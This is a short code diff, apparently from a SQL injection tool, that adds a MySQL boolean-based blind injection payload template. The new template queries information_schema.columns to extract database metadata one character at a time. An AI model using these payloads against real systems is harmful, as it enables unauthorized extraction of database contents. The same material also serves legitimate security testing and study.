@@ -40,7 +40,9 @@ column_name_payloads_boolean_based_blind = {
 
 entity_name_payloads_boolean_based_blind = {
     "MySQL": [
-        "'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0) -- "
+        "'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0) -- ",
+        "'OR IF((SELECT MID({column},{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0) -- "
+
     ]
 }
 
